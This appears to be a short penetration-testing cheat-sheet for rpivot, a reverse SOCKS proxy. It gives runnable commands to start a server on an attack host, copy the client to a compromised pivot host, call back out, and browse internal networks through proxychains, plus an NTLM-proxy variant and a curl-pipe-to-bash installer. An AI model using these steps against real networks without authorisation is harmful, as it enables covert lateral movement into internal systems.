# Rpivot

Reverse SOCKS proxy tool (Python 2.7). Binds an internal machine to an external server, allowing traffic to flow inward through a SOCKS proxy.

## Installation

```bash
git clone https://github.com/klsecservices/rpivot.git
```

### Python 2.7 (via pyenv)

```bash
curl https://pyenv.run | bash
echo 'export PYENV_ROOT="$HOME/.pyenv"' >> ~/.bashrc
echo 'command -v pyenv >/dev/null || export PATH="$PYENV_ROOT/bin:$PATH"' >> ~/.bashrc
echo 'eval "$(pyenv init -)"' >> ~/.bashrc
source ~/.bashrc
pyenv install 2.7
pyenv shell 2.7
```

Or install directly:

```bash
sudo apt-get install python2.7
```

## Usage

### Start Server on Attack Host

```bash
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```

### Transfer to Pivot Host

```bash
scp -r rpivot ubuntu@<IpaddressOfTarget>:/home/ubuntu/
```

### Run Client on Pivot Host

```bash
python2.7 client.py --server-ip 10.10.14.18 --server-port 9999
```

### Browse Internal Resources

```bash
proxychains firefox-esr 172.16.5.135:80
```

## NTLM Proxy Authentication

If behind a corporate proxy requiring NTLM auth:

```bash
python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>
```
